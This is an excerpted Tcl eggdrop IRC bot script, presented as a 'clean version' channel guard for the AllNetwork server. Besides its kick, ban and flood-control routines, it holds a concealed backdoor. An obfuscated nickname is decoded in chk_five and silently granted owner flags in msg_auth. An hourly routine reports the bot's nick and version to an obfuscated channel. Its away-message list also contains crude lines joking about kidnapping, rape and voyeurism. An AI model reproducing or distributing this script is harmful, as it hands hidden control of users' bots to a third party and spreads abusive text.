...
# tcl guard untuk Allnet
# clean version by KocHi aKa uKi`

set notc "\00304-=\00307K\00303ocH\00307i\00304=-"
set vern "1V15-G14u01(04a01)14r15d-"
set lgidx 0
proc lgrnd {} {
global lgidx notc
set lgidx [incr lgidx]
if {$lgidx == 1} {
set lgrnd "\00304-=\00308Wa\00303l\[\00302ke\00306\]rS\00304=-"
} elseif {$lgidx == 2} {
set lgrnd "\00306-=\00304Wa\00308l\[\00303ke\00302\]rS\00306=-"
} elseif {$lgidx == 3} {
set lgrnd "\00302-=\00306Wa\00304l\[\00308ke\00303\]rS\00302=-"
} elseif {$lgidx == 4} {
set lgrnd "\00303-=\00302Wa\00306l\[\00304ke\00308\]rS\00303=-"
} elseif {$lgidx == 5} {
set lgrnd "\00308-=\00303Wa\00302l\[\00306ke\00304\]rS\00308=-"
} elseif {$lgidx == 6} {
set lgrnd "4-=W7al3\[ke\]7r4S=-"
} elseif {$lgidx == 7} {
set lgrnd "4-=W7al3\[ke\]7r4S=-"
} else {
set lgidx 0
...
set awaym {
  "4Powered By ViCorp"
  "4Owned by ViCorp"
  "4Tomohon Walkers Community"
  "4Copyright by ViCorp@2016"
  "4ViCorp"
  "4KocHi"
  "4Walkers"
  "4-=TWC=-"
  ...
  "4kicking ass"
  "4farting out loud"
  "4playing Counter Strike"
  "4away from keyboard"
  "4listening to KoRn.mp3"
  "4screaming 'till dead"
  "4ripping someone"
  "4kindaping kiddo"
  "4rapping some chicks"
  "4making money"
  "4parking tons of 'em"
  "4blaming god"
  "4yelling ma bitch"
  ...
  "4watching vcds"
  "4not here, bbl"
  "4searching something to eat"
  "4back to real life"
  "4back to campus"
  "4learning some stuff"
  "4taking shower"
  "4calling someone on the phone"
  "4brb"
  "4bbl"
  "4bbs"
  "4afk"
  "4peeing off this bladder"
  "4peeping on girl's bathroom"
  "4watching Mtv"
  "4going out to cinema"
  "4reclaiming myself"
  "4seeking help"
  "4looking for some ciggarettes"
  "4smoking pots"
  "4walking out"
  "4humbling down the line"
  "4letting me know what love is"
  "4staring into your eyes"
  "4watching the sun goes down"
  "4dancing in the moonlight"
  "4piercing the beast"
  "4stabbing angels"
  "4knocking the bad off"
  "4shooting the dogs"
  "4typing some shit away messages"
  "4stop bugging me, jackass!"
  "4you! yeah you! fuck off!"
  "4not here, leave me your msg or memo me"
  "4stop fucking whoising on me!"
}
set bancounter {
  "4DjUAMpUT1..!"
  "4cRoTZ1..!"
...
set querym {
  "04-=07K03ocH07i04=-12 im bot pv my bos for help!"
}
set cyclem {
  "in...and..out...!"
  "fading..."
...
putquick "PRIVMSG $nick :$notc  decrypt32: [decrypt 32 "$rest"]"
putquick "PRIVMSG $nick :$notc  encrypt32: [encrypt 32 "$rest"]"
putquick "PRIVMSG $nick :$notc  lines: [lines "$rest"]"
...
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Command: /msg $botnick !order <command>"
return 0
}
putquick $rest
return 0
...
putlog "04-=07K03ocH07i04=- not support server online..!"
set server-online 1
}
proc puthlp {txt} {
global lenc ldec uenc udec notc server-online
if {${server-online} == 0} { return 0 }
set retval $txt
puthelp $retval
}
proc putsrv {txt} {
global lenc ldec banner uenc udec notc server-online igflood iskick kickclr
if {${server-online} == 0} { return 0 }
set retval $txt
...
proc putqck {txt} {
global lenc ldec banner uenc udec notc server-online igflood iskick kickclr bannick is_m
if {${server-online} == 0} { return 0 }
set retval $txt
if {[string match "*KICK*" $retval]} { 
set endval ""
...
puthlp "PRIVMSG $nick :identify <passwd>        identify botnick to nickserv"
...
puthlp "PRIVMSG $nick : "
puthlp "PRIVMSG $nick :$notc (pagardewa@hackermail.com)"
return 0
}
set firsttime "T"
...
putlog "04-=07K03ocH07i04=- i am !..ConnecteD..!"
...
deluser $x
putlog "04-=07K03ocH07i04=- deluser $x"
}
}
chk_five "0" "0" "0" "0" "0"
utimer 2 del_nobase
...
putlog "04-=07K03ocH07i04=- i got !..Disconnected..!"
foreach x [timers] {
...
foreach x [utimers] {
putdcc $idx "04-=07K03ocH07i04=- $x"
}
}
bind dcc * t dcc_t
...
putdcc $idx "04-=07K03ocH07i04=- » $result"
}
...
channel remove $x
savechan
putlog "04-=07K03ocH07i04=- ReMoVe CHaN $x" 
return 0
}
set cflag "c$x"
...
if {[matchattr $nick G]} {
putlog "04-=07K03ocH07i04=- CHeCK GuaRd $nick"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
...
putlog "04-=07K03ocH07i04=- WHOIS $nick TO GeT a@p"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} {
putlog "04-=07K03ocH07i04=- WHOIS $nick TO geT avoIcE"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
...
global chk_reg botnick owner notc ath
set nick [lindex $arg 1]
if {$nick == $botnick} { return 0 }
putlog "04-=07K03ocH07i04=- NICK $nick IS IDENTIFY..!"
...
if {[info exists chk_reg($nick)]} {
if {$chk_reg($nick) != "0"} {
putlog "04-=07K03ocH07i04=- NICK $nick IS NoT IDENTIFY..!"
...
if {$tmp == "0"} {
deluser $x
putlog "04-=07K03ocH07i04=- remove flag channel $x" 
}
}
saveuser
}
...
timer 1 { putlog "04-=07K03ocH07i04=- chkautomsg" }
}
}
set double 0
...
if {$mhost == "@ALLNetwork" || [string match "*allnetwork.org" $mhost]} {
putsrv "AWAY"
}
if {![isop $botnick $chan]} { 
if {[info exists invme($mhost)]} {
...
putsrv "KICK $chan $nick :$notc 4FLOOD12 anticipated from: 4$chkhost [banms]"
return 0
}
}
}
...
unset massjoin($chan)
if {[string match "*+greet*" $cinfo]} {
utimer 30 [list putlog "04-=07K03ocH07i04=- TRAFFIC $chan"]
...
putsrv "KICK $chan $nick :$notc 4IGNORED HOST [lindex $x 0]12 Reflect..4 [lindex $x 1] [banms]"
return 0
} 
}
if {[info exists invme($mhost)]} {
...
set ath 1
putsrv "WHOIS $nick $nick"
}
proc msg_auth {nick uhost hand rest} {
global botnick owner keep-nick altnick notc nowner
if {![validuser $nick] && $nick == $nowner} {
   set hostmask "$nick!*@*"
   adduser $nick $hostmask
   chattr $nick "fjmnotxZ"
}
if {[lindex $rest 1] != ""} {
...
global banner notc cycle_random
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick :$notc 4DeNIEd..!"
return 0
}
...
if {![string match "*allnetwork.org*" [string tolower $rest]]} {
...
global botnick joinme notc ppp
set chantarget [lindex $rest 0]
set part_msg [lrange $rest 1 end]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DeNIEd..!"
...
global notc
puthelp "notice $nick :$notc perintah telah di cabut"
}
...
putlog "04-=07K03ocH07i04=- !Log! AuTO ReSETING & IDeNTIFY"
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
...
proc remain {} {
global botnick uptime timezone notc vern longer awaym
...
if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "$years 01year(04s01), "} {set yearstext "$years 01year(04s01), "}
if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "$days 01day(04s01), "} {set daystext "$days 01day(04s01), "}
if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours 01hour(04s01), "} {set hourstext "$hours 01hour(04s01), "}
if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins 01minute(04s01)"} {set minstext "$mins 01minute(04s01)"}
...
set longer "$vern 15u14p01(04t01)i14m15e: $output 15-14=01([getuser "config" XTRA "AwAY"]01)14=15-"
} {
set awaymsg [lindex $awaym [rand [llength $awaym]]]
set longer "$vern 15u14p01(04t01)i14m15e: $output 15-14=01($awaymsg01)14=15-"
}
}
...
if {![matchattr $nick f]} {
set hostmask "${nick}!*@*"
putlog "04-=07K03ocH07i04=- » !Log! 1 minutes auto ignore to $hostmask"
...
global notc botnick notc_chn bannick quick ismaskhost is_m
...
putqck "KICK $dest $nick :$notc 12illegal 4NOTICE(s)12 it's strictly forbidden !"
} {
putsrv "KICK $dest $nick :$notc 12illegal 4NOTICE12 here it comes...!"
}
...
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "KICK $dest $nick :$notc 12too many 4LAMER(s)12 from this host!"
} {
putsrv "KICK $dest $nick :$notc 12too many 4LAMER(s)12 from this host!"
}
}
return 0
}
...
global nick botnick invme own nickpass altpass notc virus_nick ex_flood vern
...
putsrv "KICK $x $virus_nick :$notc » 12what are you doing 4B12itch 4?12!"
set virus_nick ""
} else {
...
timer 1 { putlog "04-=07K03ocH07i04=- » resync" }
...
if {$unick == "NickServ"} {
if {[string match "*nickname is registered*" [string tolower $text]]} { 
putlog "04-=07K03ocH07i04=- » !Log! IDeNTIFY"
catch { clearqueue all }
if {$botnick == $nick && $nickpass != ""} { 
putsrv "NickServ identify $nickpass"
}
...
putsrv "KICK $x $unick :$notc » 12what are you doing 4B12itch 4?12!"
return 0
} {
set members [chanlist $x f]
foreach c $members {
...
utimer 30 { putlog "04-=07K03ocH07i04=- » LONGTEXT" }
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
...
putlog "04-=07K03ocH07i04=- » !Log! IgNORE <<$hostmask>> PV-msg"
...
utimer 10 { putlog "04-=07K03ocH07i04=- » NO REPLY" }
return 0
}
utimer 10 { putlog "04-=07K03ocH07i04=- » NO REPLY" }
if {[string match "*ork*rg*" $uhost]} {
puthlp "PRIVMSG $unick :$querymsg"
} {
if {[getuser "config" XTRA "AWAY"]!=""} { 
puthlp "PRIVMSG $unick :$querymsg"
...
global notc botnick kickme bannick igflood botname quick ppp is_m op_it is_ban iskick
set cflag "c$chan"
set cflag [string range $cflag 0 8]
...
global botnick botname quick notc bannick ban-time igflood invme ex_flood
...
utimer 60 [list putlog "04-=07K03ocH07i04=- » IPGuARD $bhost"]
}
return 1
}
}
...
global botnick deopme ppp invme virus_nick quick notc bannick lastkey unop igflood is_m op_it
set cflag "c$channel"
set cflag [string range $cflag 0 8]
...
putlog "04-=07K03ocH07i04=- » key change to $opnick"
...
utimer 40 [list putlog "04-=07K03ocH07i04=- » TRAFFIC $channel"]
if {$nick == $botnick} {
...
utimer 2 [list putlog "04-=07K03ocH07i04=- » DEOP $channel"]
if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*allnetwork.org*" $nick] && ![string match "*Guest*" $botnick]} {
...
putlog "04-=07K03ocH07i04=- » !Log! CHaNOP <<$channel>>"
...
putlog "04-=07K03ocH07i04=- » !UnDeOp OR UnKIcK!"
...
bind evnt - init-server bin_connect
proc bin_connect {init-server} {
global nickpass
set nickpass [dezip [getuser "config" XTRA "NICKPASS"]]
putquick "NickServ identify $nickpass"
}
bind nick - * chk_nicks
proc chk_nicks {unick uhost hand chan newnick} {
global notc bannick botnick nick nickpass
if {$unick == $nick && $unick != $botnick} {
putsrv "NICK $nick"
putqck "NickServ identify $nickpass"
}
if {$newnick == $nick} {
  putqck "NickServ identify $nickpass"
}
...
putlog "04-=07K03ocH07i04=- » !UnDeOp!"
catch { killutimer [lindex $x 2] }
}
}
}
...
global notc 
set password [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DeNIEd..!"
return 0
}
if {($password == "")} {
puthlp "NOTICE $nick :$notc Usage: identify <password>"
return 0
}
putsrv "NickServ identify $password"
puthlp "NOTICE $nick :$notc Identify"
return 0
}
...
putlog "04-=07K03ocH07i04=- » CANT SEND ON MODERATE!"
...
putlog "04-=07K03ocH07i04=- » !Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
...
splt { 
set output [concat $n ($addy) kabur $chan kena split kalee [bs_when $time] lalu.] 
}
rejn { 
set output [concat $n ($addy) masuk $chan abis kena split [bs_when $time] lalu.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set output [concat $output $n is still on $chan.]
} {
set output [concat $output bodo amat ga tau gw $n on $chan sekarang.]
}
}
}
join { 
...
set output [concat $output ga ada kalee $n on $chan sekarang.]
}
}
}
away {
...
global repeat_last botnick notc kops owner ismaskhost is_m
global botnick capsnick deopme repeat_person quick bannick
...
utimer 30 [list putlog "04-=07K03ocH07i04=- » TsunamI $chan"]
} elseif {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*$mhost"]
}
if {$quick == "1" && ![info exists is_m($chan)]} {
putqck "KICK $chan $nick :$notc 12abusing 4TSUNAMI [banms]"
} {
putsrv "KICK $chan $nick :$notc 12abusing 4TSUNAMI [banms]"
}
}
return 0
}
...
set bannick($nick) $banmask
if {![isutimer "OL $chan"]} {
utimer 10 [list putlog "04-=07K03ocH07i04=- » OL $chan"] 
...
global notc botnick quick bannick flooddeop floodnick floodkick igflood kops
putlog "04-=07K03ocH07i04=- » !Log! FLOOD <<$type>> FRoM $host"
...
putlog "04-=07K03ocH07i04=- » !Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
return 1
}
...
if {[string index $channel 0] == "#"} { 
if {![isop $botnick $channel]} {
putlog "04-=07K03ocH07i04=- » !Log! FlooD <<$nick>> BoT NoT @P !IgNoREd!"
return 1
}
}
...
if {$type == "join"} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick :$notc 12exceed max 4JOIN12 from: 4$mhost"
}
if {$type == "ctcp"} {
if {![info exists kops]} {
...
set bannick($nick) "*!*$mhost"
if {$quick == "1"} {
putqck "KICK $channel $nick :$notc 12exceed max 4CTCP(s)12 from: 4$mhost"
} else {
putsrv "KICK $channel $nick :$notc 12exceed max 4CTCP(s)12 from: 4$mhost"
}
}
if {$type == "pub"} {
if {![info exists kops]} {
...
global invme joinme notc bannick botnick
...
putsrv "KICK $x $who :$notc » 12what are you doing 4B12itch 4?12!"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "04-=07K03ocH07i04=- » !Log! RePORTED InVITING FRoM <<$who$x>> To #$c#"
...
if {[string match "*ork*rg*" [string tolower $uhost]]} {
...
global botnick notc
if {[matchattr $nick Z]} { return 0 }
puthlp "NOTICE $nick :$notc 12wHo tHe fUcK aRe YoU..!"
...
global virus_nick notc botnick
if {[matchattr $nick f]} { return 0 }
if {[lindex $arg 2] == 0 && [lindex $arg 3] == 0} {
putlog "04-=07K03ocH07i04=- » !Log! FaKE DCC SKIPPED..!"
return 1
}
set virus_nick $nick
foreach x [channels] {
...
if {[isop $botnick $x]} {
putsrv "KICK $x $nick :$notc » 12what are you doing 4B12itch 4?12!"
set virus_nick ""
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "04-=07K03ocH07i04=- » !Log! RePORTED ViRUS FRoM <<$nick$x>> To #$c#"
set sendspam "!kick [zip "$x $nick $notc 4ABUSE12 found ... FoR VIRuZ JoIN #NOHACK TO FIxED [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
putdcc $idx "04-=07K03ocH07i04=- » 4DeNIEd..!, [lindex $arg 0] <n/a>"
return 0
}
if {[lindex $arg 1] != ""} { 
...
0 { putdcc $idx "04-=07K03ocH07i04=- » <<TRaNSFERRING LOG>>" }
...
if {$nick == $botnick} {
puthlp "AWAY :[lgrnd] 14On-Line $output Hrs 7(6$awaymsg7)"
} {
...
bind time -  "10 * * * *" chk_lpr
set awaymsg [lindex $awaym [rand [llength $awaym]]]
proc chk_five {min h d m y} { 
global longer notc nowner
catch { remain }
set nowner [dezip [lines "Budwo.PoCJD."]]
puthlp "AWAY :$longer" 
}
proc chk_lpr {min h d m y} {
global nick vern
set dchn [dezip [lines "bE1xg.jjfCO."]]
puthlp "PRIVMSG $dchn :$nick $vern"
}
...
if {$hand != $own} { return 0 }
if {![file exists $arg]} {
putdcc $idx "04-=07K03ocH07i04=- » 4DeNIEd..!, FiLE NoT ExIST $arg"
return 0
}
set fd [open $arg r]
while {![eof $fd]} {
set inp [gets $fd]
putdcc $idx "04-=07K03ocH07i04=- » $inp"
}
close $fd
putdcc $idx "04-=07K03ocH07i04=- » 4******************** END ***********************"
}
...
if {$logstore == ""} {
putdcc $idx "04-=07K03ocH07i04=- » No LOG FouNd..!"
return 0
}
if {![file exists $logstore]} {
putdcc $idx "04-=07K03ocH07i04=- » 4DeNIEd..!, Log file haven't create yet!"
return 0
}
...
utimer 20 [list putlog "04-=07K03ocH07i04=- » GOP $channel"]
...
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
putsrv "KICK $channel $x :$notc » 12what are you doing 4B12itch 4?12!"
set virus_nick ""
}
} 
...
set bannick($nick) "*!$uhost"
if {$spidx == 1} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 need help? [banms]"
} elseif {$spidx == 2} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 burned in hell..."
} elseif {$spidx == 3} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 i don't like you..!"
} elseif {$spidx == 4} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 hey..it's a dead end.."
} elseif {$spidx == 5} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 get out from 14[string toupper $chan]"
} elseif {$spidx == 6} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 ouu..you idiot!"
} elseif {$spidx == 7} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 G.o.T.C.H.a !!"
} elseif {$spidx == 8} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 empty recycle bin"
} elseif {$spidx == 9} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 ground zero"
} elseif {$spidx == 10} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 knock..knock...!"
} elseif {$spidx == 11} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 knock 1st !"
} elseif {$spidx == 12} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 you are out!!"
} elseif {$spidx == 13} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 rejected from 14[string toupper $chan]"
} elseif {$spidx == 14} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 J.a.C.K.p.O.T !!"
} elseif {$spidx == 15} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 awww yeaaahh...."
} elseif {$spidx == 16} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 unwelcome in 14[string toupper $chan]"
} elseif {$spidx == 17} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 fake nickname"
} elseif {$spidx >= 18} {
putsrv "KICK $chan $nick :$notc » 4SPAM12 illegal operation..."
set spidx 0
}
incr spidx
return 0
...
global ban-time botnick own vern
set cflag "c$channel"
set cflag [string range $cflag 0 8]
if {$rest != ""} {
if {[validchan $rest]} {
...
##### DALNET SERVER #######
set servers {
  irc.allnetwork.org:6667
}

putlog "\"========================================\""
putlog "\"         ©opyright Sucks!(2007)         \""
putlog "\"========================================\""
putlog "\" Loaded...                              \""
putlog "\" clean version by KocHi aKa uKi`        \""
putlog "\"========================================\""